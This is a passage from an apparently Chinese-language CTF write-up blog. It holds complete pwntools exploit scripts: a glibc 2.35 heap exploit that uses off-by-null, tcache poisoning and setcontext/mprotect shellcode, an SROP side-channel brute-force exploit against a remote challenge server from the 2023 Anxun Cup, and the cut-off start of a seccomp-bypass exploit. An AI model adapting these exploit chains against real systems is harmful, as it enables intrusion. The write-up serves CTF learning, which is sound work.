class="comment"># recovery</span></span><br><span class="line">add(<span class="number">0x418</span>)  <span class="comment">#2 C1 from ub</span></span><br><span class="line">add(<span class="number">0x428</span>)  <span class="comment">#3 bk  D  from largebin</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment">#6 fd    A from largein</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 use unsortedbin to set fd-&gt;bk</span></span><br><span class="line"><span class="comment"># partial overwrite fd -&gt; bk </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># A=P-&gt;fd</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># C1</span></span><br><span class="line"><span class="comment"># unsortedbin: C1-A ,   A-&gt;BK = C1</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment"># 2 partial overwrite bk    A-&gt;bk = p</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 use ub to set bk-&gt;fd</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># C1</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># D=P-&gt;bk</span></span><br><span class="line"><span class="comment"># ub-D-C1    D-&gt;FD = C1</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># merge D with H, preserve D-&gt;fd </span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment">#3 H1. bk-&gt;fd = p, partial write \x00</span></span><br><span class="line">add(<span class="number">0x3b0</span>) <span class="comment">#5 recovery</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step5 off by null</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="number">0x100</span>*<span class="string">b&#x27;4&#x27;</span> + p64(<span class="number">0x550</span>))<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># merge H1 with C0. trigger overlap C0,4,6</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x438</span>)<span class="comment">#3 put libc to chunk 4</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7facce0</span>-<span class="number">0x7ffff7d93000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>, <span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)) <span class="comment"># fix size for chunk 4. 6 overlap 4</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># tcache</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># tcache</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: aaaaaaaa&quot;</span>)</span><br><span class="line">heap = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x5555555605e0</span>- <span class="number">0x55555555f000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">gadget=<span class="number">0x167230</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line"><span class="comment">#target=0x1234 #要写入的地址</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>,<span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)+p64(((heap&gt;&gt;<span class="number">12</span>)+<span class="number">1</span>)^(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xc0</span>)))<span class="comment">#3 fd需要用heap处理</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">aim=heap+<span class="number">0x2c0</span></span><br><span class="line">setcontext=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">payload3 = asm(shellcode)</span><br><span class="line">payload1=flat(</span><br><span class="line">    &#123;	<span class="number">0xa8</span>:mprotect,</span><br><span class="line">    	<span class="number">0x68</span>:heap,</span><br><span class="line">    	<span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">    	<span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">    	<span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0x418</span>,payload1+p64(aim+<span class="number">0x150</span>)+payload3)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;111&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ./libcdbg/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</span></span><br><span class="line"><span class="string">b puts</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x100</span>,p32(<span class="number">0xffffffff</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">20</span>+p64(libc.address+<span class="number">0x2163c0</span>)+p64(aim+<span class="number">0xf0</span>)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="flat的使用"><a href="#flat的使用" class="headerlink" title="flat的使用"></a>flat的使用</h2><p>flat是pwntools提供的数据平坦化函数,会自动转化小端序,不过要提前指定ARCH,否则默认4字节</p>
<p><strong>在构造setcontext,fake_io时可以提供便利</strong></p>
<p>以本题为例</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   <span class="number">0xa8</span>:mprotect,</span><br><span class="line">        <span class="number">0x68</span>:heap,</span><br><span class="line">        <span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span>,</span><br><span class="line">    length=<span class="number">0x148</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>模板</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   </span><br><span class="line">        偏移(可不按顺序):值(自动小端序),</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span><span class="comment">#指定填充数据,不指定的话默认用cyclic生成填充</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>要对单个字节操作的话,也是一样的,不过要用b前缀<code>偏移:b&#39;x&#39;</code></p>
<h1 id="2023安洵杯-side-channel"><a href="#2023安洵杯-side-channel" class="headerlink" title="2023安洵杯-side-channel"></a>2023安洵杯-side-channel</h1><p><strong>标签:侧信道爆破|shellcode构造</strong></p>
<p>保护没开pie和canary</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_40136E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-2Ah] BYREF</span></span><br><span class="line">  _QWORD v2[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">0</span>] = <span class="string">&#x27;onk u oD&#x27;</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&#x27;i tahw w&#x27;</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="string">&#x27;\n?DIUS s&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;easyhack\n&quot;</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v1, <span class="number">9LL</span>);</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, &amp;unk_404060, <span class="number">4096LL</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v2, <span class="number">24LL</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, v1, <span class="number">58LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一眼栈迁移rop,有沙盒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000000f</span>  <span class="keyword">if</span> (A == rt_sigreturn) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p>只允许了这几个调用,可以看到没有write结合题目名字,猜测是要侧信道爆破</p>
<p>找了一下发现没有可利用的gadget</p>
<p>那么要控制参数只能靠rt_sigreturn系统调用了</p>
<p>但问题又来了如何触发这个系统调用,一个想法是read读取15个字符,但可以观察到主函数中的所用系统调用在使用完后都会<code>mov eax,0</code></p>
<p>那么显然不行,不过可以在程序中找到另一个syscall</p>
<p><code>0x40118A#syscall; nop; pop rbp; ret;</code></p>
<p>但还有一个问题,即如何完成read系统调用的布置,之前已经说过程序中并没有这样的gadget可以利用,但我们可以发现在原程序最后ret的时候,rdi,rsi,rdx三个寄存器依然保持着最后一个系统调用read的状态,那么直接syscall触发读取15个字节即可,之后再返回到syscall触发srop</p>
<p>然后执行mprotect修改bss段权限,执行open和read,并增加一段shellcode用于逐个字符爆破</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">mov bl,[rax]</span></span><br><span class="line"><span class="string">cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">jz  0x404000</span></span><br><span class="line"><span class="string">jmp $-0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br></pre></td></tr></table></figure>
<p>如果相等则会直接段错误,但如果不等则会无限循环,等待程序处理</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos,char</span>):</span><br><span class="line">	r()</span><br><span class="line">	shellcode=shellcraft.chmod(<span class="string">&#x27;file&#x27;</span>,<span class="number">0o777</span>)</span><br><span class="line">	shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">	shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x404800</span>,<span class="number">64</span>)</span><br><span class="line">	shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">	mov bl,[rax]</span></span><br><span class="line"><span class="string">	cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">	jz  0x404000</span></span><br><span class="line"><span class="string">	jmp $-0</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br><span class="line"></span><br><span class="line">	sigframe = SigreturnFrame()</span><br><span class="line">	sigframe.rax=<span class="number">0xa</span></span><br><span class="line">	sigframe.rdi=<span class="number">0x404000</span></span><br><span class="line">	sigframe.rsi=<span class="number">0x1000</span></span><br><span class="line">	sigframe.rdx=<span class="number">0x7</span></span><br><span class="line">	sigframe.rip=syscall_ret</span><br><span class="line">	sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span class="line">	payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">	payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x404470</span>)</span><br><span class="line">	payload+=asm(shellcode,vma=<span class="number">0x400000</span>)<span class="comment">#pwntools asm带跳转的代码需要指定基址vma</span></span><br><span class="line">	s(payload)</span><br><span class="line"></span><br><span class="line">	payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line">	<span class="comment">#dbg()</span></span><br><span class="line">	s(payload)</span><br><span class="line">	sleep(<span class="number">0.01</span>)</span><br><span class="line">	s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">string=<span class="string">b&quot;0123456789abcdef&#125;&quot;</span>      </span><br><span class="line"></span><br><span class="line">lr=<span class="number">0x401446</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">pos=<span class="number">0</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	time=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;pos:&#123;&#125; time:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(pos,time))</span><br><span class="line">		<span class="comment">#p=process(elf_path)</span></span><br><span class="line">		p=remote(<span class="string">&#x27;47.108.206.43&#x27;</span>,<span class="number">26052</span>)</span><br><span class="line">		pwn(pos,i)</span><br><span class="line">		r()</span><br><span class="line">		time+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">chr</span>(i)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">			b=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">			p.close()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag += <span class="built_in">chr</span>(i)</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> b==<span class="number">1</span> :</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	pos+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;success:&#x27;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23099102-a168-11ee-8c62-00163e0447d0</span></span><br></pre></td></tr></table></figure>
<h1 id="2023安洵杯-seccomp"><a href="#2023安洵杯-seccomp" class="headerlink" title="2023安洵杯-seccomp"></a>2023安洵杯-seccomp</h1><p><strong>标签:沙盒|rop</strong></p>
<p>上一题的弱化版,不过远程打不开flag是什么鬼</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span 